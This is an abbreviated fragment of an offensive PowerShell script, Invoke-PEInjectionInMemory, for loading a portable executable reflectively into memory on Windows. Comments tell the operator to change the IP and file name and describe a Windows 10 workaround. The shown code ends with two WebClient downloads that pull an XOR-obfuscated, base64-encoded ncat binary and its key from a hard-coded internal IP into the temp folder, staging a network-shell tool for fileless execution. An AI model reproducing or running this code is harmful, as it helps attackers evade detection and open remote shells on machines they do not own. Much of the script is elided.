<#
comment on line 836 for win 10
chnge IP/url and file name on line 2714-2715
#>
function Invoke-PEInjectionInMemory
{
...
　
	...
	Function Get-ProcAddress
	{
      ...
      <# 
      original $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress') --> this works up to windows 8.1
      for windows 10 leave the command below active
	    #>
...
(new-object Net.WebClient).DownloadFile('http://10.29.22.165/ncatbase64M_xored' , $env:temp+"/ciphertext")
(new-object Net.WebClient).DownloadFile('http://10.29.22.165/ncatxored_key' , $env:temp+"/key")
